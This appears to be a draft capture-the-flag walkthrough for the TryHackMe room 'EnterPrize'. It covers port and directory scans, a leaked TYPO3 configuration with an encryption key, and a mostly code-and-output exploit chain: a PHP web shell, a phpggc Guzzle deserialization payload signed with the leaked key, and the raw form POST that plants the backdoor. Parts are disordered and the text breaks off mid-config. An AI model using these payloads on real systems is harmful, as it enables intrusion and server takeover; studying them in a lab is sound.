<h1>EnterPrize</h1>
<p>
2025, August 2 - Day 453<br>
2025, November 25 - Day 1</p>


<img width="1902" height="307" alt="image" src="https://github.com/user-attachments/assets/8140e461-ae83-43c6-8b74-326c4dcc399d" />

<br>
<br>
<br>
<h1 align="left">Summary</h1>
<p>

- [Port Scanning](#1) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - &nbsp;&nbsp;&nbsp; 22 &nbsp;&nbsp; . &nbsp;&nbsp; 80 &nbsp;&nbsp; . &nbsp;&nbsp; 443<br>
- [Static Host Mapping](#2) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - &nbsp;&nbsp;&nbsp; enterprize.thm<br>
- [Web Vulberability Scanning](#3)<br>
- [Web Vulberability Scanning](#3)<br>
- [Web Interface Inspection](#4)<br>
- [Subdomain Enumeration](#5) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - &nbsp;&nbsp;&nbsp; maintest<br>
- [Static Host Mapping](#6) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - &nbsp;&nbsp;&nbsp; enterprize.thm &nbsp;&nbsp; . &nbsp;&nbsp; maintest.enterprize.thm<br>
- [Web Interface Inspection](#7) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - &nbsp;&nbsp;&nbsp; TYPO3 CMS<br>
- [Directory and File Enumeration](#8)<br>
- [Web Interface Inspection](#9) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - &nbsp;&nbsp;&nbsp; /typo3conf/LocalConfiguration.old &nbsp; . &nbsp; driver &nbsp; . &nbsp; mysli &nbsp; . &nbsp; host &nbsp; . &nbsp; dbname &nbsp; . &nbsp; password<br>


- [Web Interface Inspection, Weaponization, Delivery & Execution](#5)<br>
- [Initial Foothold](#6)<br>
- [Privilege Escalation & User Flag](#7)<br>
- [Privilege Escalation & Root Flag](#8)</p>

<br>
<br>
<br>
<br>
<br>

<h1>Task 1 . Hack your way in</h1>
<p>Deploy the machine and add <code>MACHINE_IP enterprize.thm</code> to your hosts file.<br>

Enumerate the target carefully. If you need a hint, you might want to save it for later.</p>

<p><em>Answer the questions below</em></p>

<br>

<h1 align="center">Port Scanning<a id='1'></h1>

<div align="center"><p>

| **Port**     | **Protocol** |**Service**                      |
|-------------:|-------------:|:--------------------------------|
| `22`         | SSH          |OpenSSH 7.6p1 Ubuntu 4ubuntu0.3  |
| `80`         | HTTP         |Apache httpd                     |
| `443`        | HTTPS        |nginx                            |

</p></div><br>


```bash
:~/Enterprize# nmap -sT -p- -T4 xx.xx.xxx.xxx
...
PORT    STATE  SERVICE
22/tcp  open   ssh
80/tcp  open   http
443/tcp closed https
```

```bash
:~/Enterprize# nmap -sC -sV -p22,80 --min-rate=10000 xx.xx.xxx.xxx
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 67:c0:57:34:91:94:be:da:4c:fd:92:f2:09:9d:36:8b (RSA)
|   256 13:ed:d6:6f:ea:b4:5b:87:46:91:6b:cc:58:4d:75:11 (ECDSA)
|_  256 25:51:84:fd:ef:61:72:c6:9d:fa:56:5f:14:a1:6f:90 (ED25519)
80/tcp open  http    Apache httpd
|_http-server-header: Apache
|_http-title: Blank Page
```

```bash
:~/Enterprize# rustscan -a xx.xx.xxx.xxx --ulimit 5500 -b 65535 -- -A -Pn
...
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 67:c0:57:34:91:94:be:da:4c:fd:92:f2:09:9d:36:8b (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCdxS3na4GeYRrzzfQRZn/S3w1oFS9UMKUHyIrR0MIgjqXWulraEelyuL82K7Fv2zCcMlgSl+pzK+go6BhAzKG/+GfkpBquZm00CN/hzTJ07y14aseiVDOY/Gl6kWOO5upG2/8uQFi9tBSJLH4SJkcAag2l6tw7kZ9WYxkbAS9OMgSjmAROOhVwNTH3fSCdMhuQitC/b1F5F2grd43Li7w1jrNiROFnycbvyCxVkMxcVFSzr70caJ2CYw/WSZi3adJ8EtdY7XQj1nd2DaihIMGYUs9/J2vAK58fzqwnQNGbqQ19pJWyimmr6tFWGsBetdZm8bP56s6wqvVEEetmLl13
|   256 13:ed:d6:6f:ea:b4:5b:87:46:91:6b:cc:58:4d:75:11 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLnmHA9LOr6rBx5KxdL++QodEFqNERudlCPb21dqEr1uxQplAKgqwfS11usQR1scxOMrBsth2QmLi/6R5CqJU/Q=
|   256 25:51:84:fd:ef:61:72:c6:9d:fa:56:5f:14:a1:6f:90 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICw0LYJQC2A5p73rqH1M0Xi5SsfuiM+1JHkgEff7IT9M
80/tcp open  http    syn-ack Apache httpd
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache
|_http-title: Blank Page
```

<br>
<h1 align="center">Static Host Mapping<a id='2'></h1>

```bash
xx.xx.xx.xx    enterprize.thm
```

<br>
<h1 align="center">Web Vulnerability Scanning<a id='3'></h1>
<p align="center">/icons/README &nbsp;&nbsp;&nbsp; - &nbsp;&nbsp;&nbsp; /composer.json</p>

```bash
~/Enterprize# nikto -h enterprize.thm -no404
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.80.187.214
+ Target Hostname:    enterprize.thm
+ Target Port:        80
+ Start Time:         2025-11-25 18:15:56 (GMT0)
---------------------------------------------------------------------------
+ Server: Apache
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server leaks inodes via ETags, header found with file /, fields: 0x55 0x5b80455b93e7e 
+ Allowed HTTP Methods: OPTIONS, HEAD, GET, POST 
+ OSVDB-3233: /icons/README: Apache default file found.
+ 6544 items checked: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2025-11-25 18:16:04 (GMT0) (8 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

<br>
<h1 align="center">.....<a id='3'></h1>
<p align="center">...</p>

```bash
:~/Enterprize# gobuster dir -u http://enterprize.thm/ -w /usr/share/dirb/wordlists/common.txt -x html,phps,json --exclude-length 199
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://enterprize.thm/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] Exclude Length:          199
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,phps,json
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/composer.json        (Status: 200) [Size: 589]
/index.html           (Status: 200) [Size: 85]
/index.html           (Status: 200) [Size: 85]
Progress: 18456 / 18460 (99.98%)
===============================================================
Finished
===============================================================
```

<img width="1232" height="436" alt="image" src="https://github.com/user-attachments/assets/585799af-1e59-4182-b415-2fd80579ffd1" />

<br>
<h1 align="center">Web Interface Inspection<a id='4'></h1>
<h3 align="center">enterprize.thm</h3>

<img width="1060" height="146" alt="image" src="https://github.com/user-attachments/assets/a8b07558-a14d-4296-913f-abe5f3418b60" />

<h3 align="center">enterprize.thm/<code>composer.json</code></h3>

```bash
:~/Enterprize# curl http://enterprize.thm/composer.json
{
    "name": "superhero1/enterprize",
    "description": "THM room EnterPrize",
    "type": "project",
    "require": {
        "typo3/cms-core": "^9.5",
        "guzzlehttp/guzzle": "~6.3.3",
        "guzzlehttp/psr7": "~1.4.2",
        "typo3/cms-install": "^9.5",
	"typo3/cms-backend": "^9.5",
        "typo3/cms-core": "^9.5",
        "typo3/cms-extbase": "^9.5",
        "typo3/cms-extensionmanager": "^9.5",
        "typo3/cms-frontend": "^9.5",
        "typo3/cms-install": "^9.5",
	"typo3/cms-introduction": "^4.0"
    },
    "license": "GPL",
    "minimum-stability": "stable"
}
```

<img width="1057" height="423" alt="image" src="https://github.com/user-attachments/assets/69aaf522-309c-4968-853d-90997302284c" />

<br>
<h3 align="center">enterprize.thm/<code>index.html</code></h3>

```bash
:~/Enterprize# curl http://enterprize.thm/index.html
<html><head><title>Blank Page</title></head><body>Nothing to see here.</body></html>
```

<img width="1062" height="150" alt="image" src="https://github.com/user-attachments/assets/b3425cfa-a823-4ff3-a84e-5f1d14e9afbf" />


<br>
<h1 align="center">Subdomain Enumeration<a id='5'></h1>

```bash
:~/Enterprize# ffuf -u http://enterprize.thm/ -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H 'Host: FUZZ.enterprize.thm' -fs 85
...
maintest                [Status: 200, Size: 24555, Words: 1438, Lines: 49]
```

<br>
<h1 align="center">Static Host Mapping<a id='6'></h1>

```bash
xx.xx.xx.xx    enterprize.thm maintest.enterprize.thm
```

<br>
<h1 align="center">Web Interface Inspection<a id='7'></h1>
<h3 align="center">main.enterprize.thm</h3><p align="center">TYPO3 CMS</p>

<img width="1132" height="543" alt="image" src="https://github.com/user-attachments/assets/c6f53c06-8884-4339-8cd5-94471ce748a1" />

<br>
<h1 align="center">Directory & File Enumeration<a id='8'></h1>

```bash
:~/EnterPrize/Typo3Scan# ffuf -u http://maintest.enterprize.thm/FUZZ -c -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt -mc all -fs 196 -t 80
...
typo3                   [Status: 301, Size: 245, Words: 14, Lines: 8]
fileadmin               [Status: 301, Size: 249, Words: 14, Lines: 8]
typo3conf               [Status: 301, Size: 249, Words: 14, Lines: 8]
typo3temp               [Status: 301, Size: 249, Words: 14, Lines: 8]
server-status           [Status: 403, Size: 199, Words: 14, Lines: 8]
                        [Status: 200, Size: 24555, Words: 1438, Lines: 49
```

```bash
:~/Enterprize# gobuster dir -u http://maintest.enterprize.thm/ -w /usr/share/dirb/wordlists/common.txt -e -k -q --exclude-length 199
http://maintest.enterprize.thm/fileadmin            (Status: 301) [Size: 249] [--> http://maintest.enterprize.thm/fileadmin/]
http://maintest.enterprize.thm/index.php            (Status: 200) [Size: 24555]
http://maintest.enterprize.thm/typo3conf            (Status: 301) [Size: 249] [--> http://maintest.enterprize.thm/typo3conf/]
http://maintest.enterprize.thm/typo3                (Status: 301) [Size: 245] [--> http://maintest.enterprize.thm/typo3/]
http://maintest.enterprize.thm/typo3temp            (Status: 301) [Size: 249] [--> http://maintest.enterprize.thm/typo3temp/]
```

<img width="1232" height="139" alt="image" src="https://github.com/user-attachments/assets/6bac6a56-ae42-449d-9525-f28fefa9f8ec" />

<br>
<br>

```bash
:~/Enterprize# gobuster dir -u http://maintest.enterprize.thm/fileadmin/ -w /usr/share/dirb/wordlists/common.txt -e -k -q --exclude-length 199
http://maintest.enterprize.thm/fileadmin/introduction         (Status: 301) [Size: 262] [--> http://maintest.enterprize.thm/fileadmin/introduction/]
http://maintest.enterprize.thm/fileadmin/user_upload          (Status: 301) [Size: 261] [--> http://maintest.enterprize.thm/fileadmin/user_upload/]
```


<img width="1227" height="90" alt="image" src="https://github.com/user-attachments/assets/60c08d50-daad-4318-b735-9dff5638266c" />

<br>
<br>
<br>

<h3>maintest.enterprize.thm/fileadmin/</h3>

<img width="1059" height="323" alt="image" src="https://github.com/user-attachments/assets/3e4857e5-90f2-42c9-98d0-6bb46ec656e8" />

<br>
<br>
<h3>maintest.enterprize.thm/index.php</h3>


<img width="1275" height="793" alt="image" src="https://github.com/user-attachments/assets/66828091-0dc8-4fa8-9bf8-e09abdb374b1" />

<br>
<br>
<h3>maintest.enterprize.thm/typo3conf/</h3>

<img width="1264" height="347" alt="image" src="https://github.com/user-attachments/assets/7f9f98b4-a735-4dd4-a456-4de60944fb61" />

<br>
<br>
<h3>maintest.enterprize.thm/typo3conf/LocalConfiguration.old</h3>

<img width="1264" height="393" alt="image" src="https://github.com/user-attachments/assets/62f8a2c0-1bc6-4143-a16f-d20749ab8739" />


```bash
:~/Enterprize# gobuster dir -u http://maintest.enterprize.thm/fileadmin/ -w /usr/share/dirb/wordlists/common.txt -e -k -q --exclude-length 199
http://maintest.enterprize.thm/fileadmin/introduction         (Status: 301) [Size: 262] [--> http://maintest.enterprize.thm/fileadmin/introduction/]
http://maintest.enterprize.thm/fileadmin/user_upload          (Status: 301) [Size: 261] [--> http://maintest.enterprize.thm/fileadmin/user_upload/]
```




:~/Enterprize/phpggc# cat exploitation.php
<?php $output = system($_GET[1]); echo $output ; ?>




root@ip-10-80-69-92:~/Enterprize# git clone https://github.com/ambionics/phpggc
Cloning into 'phpggc'...
remote: Enumerating objects: 4860, done.
remote: Counting objects: 100% (920/920), done.
remote: Compressing objects: 100% (306/306), done.
remote: Total 4860 (delta 709), reused 619 (delta 614), pack-reused 3940 (from 3)
Receiving objects: 100% (4860/4860), 706.02 KiB | 13.84 MiB/s, done.
Resolving deltas: 100% (2222/2222), done.


root@ip-10-80-69-92:~/Enterprize# ls
exploitation.php  phpggc  reports


root@ip-10-80-69-92:~/Enterprize# cd phpggc


root@ip-10-80-69-92:~/Enterprize/phpggc# ls
Dockerfile  gadgetchains  lib  LICENSE  phpggc  README.md  templates  test-gc-compatibility.py


root@ip-10-80-69-92:~/Enterprize/phpggc# ./phpggc -l Guzzle

Gadget Chains
-------------

NAME                     VERSION                         TYPE                  VECTOR        I    
Guzzle/FW1               4.0.0-rc.2 <= 7.5.0+            File write            __destruct         
Guzzle/INFO1             6.0.0 <= 6.3.2                  phpinfo()             __destruct    *    
Guzzle/RCE1              6.0.0 <= 6.3.2                  RCE: Function Call    __destruct    *    
Pydio/Guzzle/RCE1        < 8.2.2                         RCE: Function Call    __toString         
WordPress/Guzzle/RCE1    4.0.0 <= 6.4.1+ & WP < 5.5.2    RCE: Function Call    __toString    *    
WordPress/Guzzle/RCE2    4.0.0 <= 6.4.1+ & WP < 5.5.2    RCE: Function Call    __destruct    *    


:~/Enterprize/phpggc# ./phpggc -b --fast-destruct Guzzle/FW1 /var/www/html/public/fileadmin/_temp_/backdoor.php /root/Enterprize/phpggc/exploitation.php
YToyOntpOjc7TzozMToiR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphciI6NDp7czo0MToiAEd1enpsZUh0dHBcQ29va2llXEZpbGVDb29raWVKYXIAZmlsZW5hbWUiO3M6NTA6Ii92YXIvd3d3L2h0bWwvcHVibGljL2ZpbGVhZG1pbi9fdGVtcF8vYmFja2Rvb3IucGhwIjtzOjUyOiIAR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphcgBzdG9yZVNlc3Npb25Db29raWVzIjtiOjE7czozNjoiAEd1enpsZUh0dHBcQ29va2llXENvb2tpZUphcgBjb29raWVzIjthOjE6e2k6MDtPOjI3OiJHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUiOjE6e3M6MzM6IgBHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUAZGF0YSI7YTozOntzOjc6IkV4cGlyZXMiO2k6MTtzOjc6IkRpc2NhcmQiO2I6MDtzOjU6IlZhbHVlIjtzOjUyOiI8P3BocCAkb3V0cHV0ID0gc3lzdGVtKCRfR0VUWzFdKTsgZWNobyAkb3V0cHV0IDsgPz4KIjt9fX1zOjM5OiIAR3V6emxlSHR0cFxDb29raWVcQ29va2llSmFyAHN0cmljdE1vZGUiO047fWk6NztpOjc7fQ==




:~/Enterprize/phpggc# cat a.php
<?php
echo hash_hmac('sha1', 'YToyOntpOjc7TzozMToiR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphciI6NDp7czo0MToiAEd1enpsZUh0dHBcQ29va2llXEZpbGVDb29raWVKYXIAZmlsZW5hbWUiO3M6NTA6Ii92YXIvd3d3L2h0bWwvcHVibGljL2ZpbGVhZG1pbi9fdGVtcF8vYmFja2Rvb3IucGhwIjtzOjUyOiIAR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphcgBzdG9yZVNlc3Npb25Db29raWVzIjtiOjE7czozNjoiAEd1enpsZUh0dHBcQ29va2llXENvb2tpZUphcgBjb29raWVzIjthOjE6e2k6MDtPOjI3OiJHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUiOjE6e3M6MzM6IgBHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUAZGF0YSI7YTozOntzOjc6IkV4cGlyZXMiO2k6MTtzOjc6IkRpc2NhcmQiO2I6MDtzOjU6IlZhbHVlIjtzOjUyOiI8P3BocCAkb3V0cHV0ID0gc3lzdGVtKCRfR0VUWzFdKTsgZWNobyAkb3V0cHV0IDsgPz4KIjt9fX1zOjM5OiIAR3V6emxlSHR0cFxDb29raWVcQ29va2llSmFyAHN0cmljdE1vZGUiO047fWk6NztpOjc7fQ==', '712dd4d9c583482940b75514e31400c11bdcbc7374c8e62fff958fcd80e8353490b0fdcf4d0ee25b40cf81f523609c0b');
?>


92:~/Enterprize/phpggc# ./phpggc -b --fast-destruct Guzzle/FW1 /var/www/html/public/fileadmin/_temp_/rosa.php /root/Enterprize/phpggc/a.php > r.txt


root@ip-10-80-69-92:~/Enterprize/phpggc# cat r.txt
YToyOntpOjc7TzozMToiR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphciI6NDp7czo0MToiAEd1enpsZUh0dHBcQ29va2llXEZpbGVDb29raWVKYXIAZmlsZW5hbWUiO3M6NDY6Ii92YXIvd3d3L2h0bWwvcHVibGljL2ZpbGVhZG1pbi9fdGVtcF8vcm9zYS5waHAiO3M6NTI6IgBHdXp6bGVIdHRwXENvb2tpZVxGaWxlQ29va2llSmFyAHN0b3JlU2Vzc2lvbkNvb2tpZXMiO2I6MTtzOjM2OiIAR3V6emxlSHR0cFxDb29raWVcQ29va2llSmFyAGNvb2tpZXMiO2E6MTp7aTowO086Mjc6Ikd1enpsZUh0dHBcQ29va2llXFNldENvb2tpZSI6MTp7czozMzoiAEd1enpsZUh0dHBcQ29va2llXFNldENvb2tpZQBkYXRhIjthOjM6e3M6NzoiRXhwaXJlcyI7aToxO3M6NzoiRGlzY2FyZCI7YjowO3M6NToiVmFsdWUiO3M6ODUwOiI8P3BocAokc2VjcmV0ID0gaGFzaF9obWFjKCdzaGExJywgJ1lUb3lPbnRwT2pjN1R6b3pNVG9pUjNWNmVteGxTSFIwY0Z4RGIyOXJhV1ZjUm1sc1pVTnZiMnRwWlVwaGNpSTZORHA3Y3pvME1Ub2lBRWQxZW5wc1pVaDBkSEJjUTI5dmEybGxYRVpwYkdWRGIyOXJhV1ZLWVhJQVptbHNaVzVoYldVaU8zTTZOVEE2SWk5MllYSXZkM2QzTDJoMGJXd3ZjSFZpYkdsakwyWnBiR1ZoWkcxcGJpOWZkR1Z0Y0Y4dlltRmphMlJ2YjNJdWNHaHdJanR6T2pVeU9pSUFSM1Y2ZW14bFNIUjBjRnhEYjI5cmFXVmNSbWxzWlVOdmIydHBaVXBoY2dCemRHOXlaVk5sYzNOcGIyNURiMjlyYVdWeklqdGlPakU3Y3pvek5qb2lBRWQxZW5wc1pVaDBkSEJjUTI5dmEybGxYRU52YjJ0cFpVcGhjZ0JqYjI5cmFXVnpJanRoT2pFNmUyazZNRHRQT2pJM09pSkhkWHA2YkdWSWRIUndYRU52YjJ0cFpWeFRaWFJEYjI5cmFXVWlPakU2ZTNNNk16TTZJZ0JIZFhwNmJHVklkSFJ3WEVOdmIydHBaVnhUWlhSRGIyOXJhV1VBWkdGMFlTSTdZVG96T250ek9qYzZJa1Y0Y0dseVpYTWlPMms2TVR0ek9qYzZJa1JwYzJOaGNtUWlPMkk2TUR0ek9qVTZJbFpoYkhWbElqdHpPalV5T2lJOFAzQm9jQ0FrYjNWMGNIVjBJRDBnYzNsemRHVnRLQ1JmUjBWVVd6RmRLVHNnWldOb2J5QWtiM1YwY0hWMElEc2dQejRLSWp0OWZYMXpPak01T2lJQVIzVjZlbXhsU0hSMGNGeERiMjlyYVdWY1EyOXZhMmxsU21GeUFITjBjbWxqZEUxdlpHVWlPMDQ3ZldrNk56dHBPamM3ZlE9PScsICc3MTJkZDRkOWM1ODM0ODI5NDBiNzU1MTRlMzE0MDBjMTFiZGNiYzczNzRjOGU2Mm





:~/Enterprize/phpggc# cat r.txt | openssl dgst -sha1 -hmac '712dd4d9c583482940b75514e31400c11bdcbc7374c8e62fff958fcd80e8353490b0fdcf4d0ee25b40cf81f523609c0b'
(stdin)= 2d7a22d739933b5856fb6e7421548a9b4522bcdc



POST /index.php?id=38&tx_form_formframework%5Baction%5D=perform&tx_form_formframework%5Bcontroller%5D=FormFrontend&cHash=63896b2174306c4f96ada29453d1cd18 HTTP/1.1
Host: maintest.enterprize.thm
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------135680671225349365022964922376
Content-Length: 2259
Origin: http://maintest.enterprize.thm
Connection: keep-alive
Referer: http://maintest.enterprize.thm/index.php?id=38
Cookie: cookieconsent_status=dismiss; fe_typo_user=3c47f4fe60c1e06fc5dbb78428c11c7f
Upgrade-Insecure-Requests: 1
Priority: u=0, i

-----------------------------135680671225349365022964922376
Content-Disposition: form-data; name="tx_form_formframework[contactForm-144][__state]"

YToyOntpOjc7TzozMToiR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphciI6NDp7czo0MToiAEd1enpsZUh0dHBcQ29va2llXEZpbGVDb29raWVKYXIAZmlsZW5hbWUiO3M6NTA6Ii92YXIvd3d3L2h0bWwvcHVibGljL2ZpbGVhZG1pbi9fdGVtcF8vYmFja2Rvb3IucGhwIjtzOjUyOiIAR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphcgBzdG9yZVNlc3Npb25Db29raWVzIjtiOjE7czozNjoiAEd1enpsZUh0dHBcQ29va2llXENvb2tpZUphcgBjb29raWVzIjthOjE6e2k6MDtPOjI3OiJHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUiOjE6e3M6MzM6IgBHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUAZGF0YSI7YTozOntzOjc6IkV4cGlyZXMiO2k6MTtzOjc6IkRpc2NhcmQiO2I6MDtzOjU6IlZhbHVlIjtzOjUyOiI8P3BocCAkb3V0cHV0ID0gc3lzdGVtKCRfR0VUWzFdKTsgZWNobyAkb3V0cHV0IDsgPz4KIjt9fX1zOjM5OiIAR3V6emxlSHR0cFxDb29raWVcQ29va2llSmFyAHN0cmljdE1vZGUiO047fWk6NztpOjc7fQ==2d7a22d739933b5856fb6e7421548a9b4522bcdc
-----------------------------135680671225349365022964922376
Content-Disposition: form-data; name="tx_form_formframework[__trustedProperties]"

a:1:{s:15:"contactForm-144";a:6:{s:4:"name";i:1;s:7:"subject";i:1;s:15:"HtZRaJ2BGcK46Xj";i:1;s:5:"email";i:1;s:7:"message";i:1;s:13:"__currentPage";i:1;}}e5a2f75ca729afe499660474d3fc1b75fee1b4da
-----------------------------135680671225349365022964922376
Content-Disposition: form-data; name="tx_form_formframework[contactForm-144][name]"

test
-----------------------------135680671225349365022964922376
Content-Disposition: form-data; name="tx_form_formframework[contactForm-144][subject]"

test
-----------------------------135680671225349365022964922376
Content-Disposition: form-data; name="tx_form_formframework[contactForm-144][HtZRaJ2BGcK46Xj]"


-----------------------------135680671225349365022964922376
Content-Disposition: form-data; name="tx_form_formframework[contactForm-144][email]"

lulu@mail.com
-----------------------------135680671225349365022964922376
Content-Disposition: form-data; name="tx_form_formframework[contactForm-144][message]"

test
-----------------------------135680671225349365022964922376
Content-Disposition: form-data; name="tx_form_formframework[contactForm-144][__currentPage]"

2
-----------------------------135680671225349365022964922376--





Response

<div class="frame-inner">Oops, an error occurred! Code: 20251125201918369d7f80</div>



sudo apt install -y php7.4 php7.4-cli php7.4-common php7.4-mysql php7.4-zip php7.4-gd php7.4-mbstring php7.4-curl php7.4-xml php7.4-fpm libapache2-mod-php7.4



:~/Enterprize/phpggc# php -v
PHP 7.4.3-4ubuntu2.29 (cli) (built: Mar 25 2025 18:57:03) ( NTS )
Copyright (c) The PHP Group
Zend Engine v3.4.0, Copyright (c) Zend Technologies
    with Zend OPcache v7.4.3-4ubuntu2.29, Copyright (c), by Zend Technologies








<img width="1171" height="654" alt="image" src="https://github.com/user-attachments/assets/aaf561ac-aed0-4d71-927e-34a2f5f6e126" />




<img width="1171" height="536" alt="image" src="https://github.com/user-attachments/assets/1939911f-df18-4dfe-9e09-6c0699c29737" />




<img width="1163" height="505" alt="image" src="https://github.com/user-attachments/assets/2d2d7621-37da-4fae-83e3-439ce84da4aa" />


<img width="1167" height="410" alt="image" src="https://github.com/user-attachments/assets/83859309-66c1-4bfe-895a-0ca9613197c4" />





<br>
<h1 align="center">Web Interface Inspection<a id='9'></h1>
<h3 align="center">maintest.enterprize.thm/<code>typo3</code>/</h3>

<img width="1129" height="500" alt="image" src="https://github.com/user-attachments/assets/d72fb7b7-c69b-4e01-b542-45e8c21d7099" />


<br>
<br>
<h3 align="center">maintest.enterprize.thm/<code>typo3conf</code>/</h3><p align="center">/LocalConfiguration.old &nbsp;&nbsp;&nbsp; - &nbsp;&nbsp;&nbsp; /LocalConfiguration.php &nbsp;&nbsp;&nbsp; - &nbsp;&nbsp;&nbsp; /PackgeStates.php &nbsp;&nbsp;&nbsp; - &nbsp;&nbsp;&nbsp; /ext/ &nbsp;&nbsp;&nbsp; - &nbsp;&nbsp;&nbsp; /l10n/</p>

<img width="1126" height="412" alt="image" src="https://github.com/user-attachments/assets/e55cb545-8c7e-4641-a5f6-0115ea2cd943" />

<br>
<h3 align="center">maintest.enterprize.thm/<code>typo3conf</code>/<code>LocalConfiguration.old</code></h3>
<p align="center">installToolPassword &nbsp; : &nbsp; $argon2i$v=19$m=65536,t=16,p=<br>passwordHashing &nbsp; : &nbsp; className &nbsp; : &nbsp; TYPO3\\CMS\\Core\\Crypto\\PasswordHashing\\Argon2iPasswordHash<br>dbname &nbsp; : &nbsp; typo3 &nbsp;&nbsp;&nbsp; - &nbsp;&nbsp;&nbsp; driver &nbsp; : &nbsp; mysqli &nbsp;&nbsp;&nbsp; - &nbsp;&nbsp;&nbsp; host &nbsp; : &nbsp; 127.0.0.1 &nbsp;&nbsp;&nbsp; - &nbsp;&nbsp;&nbsp; password &nbsp; : &nbsp; password1 &nbsp;&nbsp;&nbsp; - &nbsp;&nbsp;&nbsp; port &nbsp; : &nbsp; 3306<br>encryptionKey &nbsp; : &nbsp;712dd4d9c583482940b75514e31400c11bdcbc7374c8e62fff958fcd80e8353490b0fdcf4d0ee25b40cf81f523609c0b</p>


```bash
(venv) :~/EnterPrize# cat LocalConfiguration.old
<?php
return [
    'BE' => [
        'debug' => false,
        'explicitADmode' => 'explicitAllow',
        'installToolPassword' => '$argon2i$v=19$m=65536,t=16,p=', //removed hash for security!!
        'loginSecurityLevel' => 'normal',
        'passwordHashing' => [
            'className' => 'TYPO3\\CMS\\Core\\Crypto\\PasswordHashing\\Argon2iPasswordHash',
            'options' => [],
        ],
    ],
    'DB' => [
        'Connections' => [
            'Default' => [
                'charset' => 'utf8mb4',
                'dbname' => 'typo3',
                'driver' => 'mysqli',
                'host' => '127.0.0.1',
                'password' => 'password1', //replaced old password by 24 random chars & symbols
                'port' => 3306,
                'tableoptions' => [
                    'charset' => 'utf8mb4',
                    'collate' => 'utf8mb4_unicode_ci',
                ],
                'user' => 'typo3user',
            ],
        ],
    ],
    'EXT' => [
        'extConf' => [
            'backend' => 'a:6:{s:14:"backendFavicon";s:0:"";s:11:"backendLogo";s:0:"";s:20:"loginBackgroundImage";s:0:"";s:13:"loginFootnote";s:0:"";s:19:"loginHighlightColor";s:0:"";s:9:"loginLogo";s:0:"";}',
            'bootstrap_package' => 'a:8:{s:20:"disableCssProcessing";s:1:"0";s:17:"disableFontLoader";s:1:"0";s:24:"disableGoogleFontCaching";s:1:"0";s:27:"disablePageTsBackendLayouts";s:1:"0";s:28:"disablePageTsContentElements";s:1:"0";s:16:"disablePageTsRTE";s:1:"0";s:20:"disablePageTsTCEFORM";s:1:"0";s:20:"disablePageTsTCEMAIN";s:1:"0";}',
            'extensionmanager' => 'a:2:{s:21:"automaticInstallation";s:1:"1";s:11:"offlineMode";s:1:"0";}',
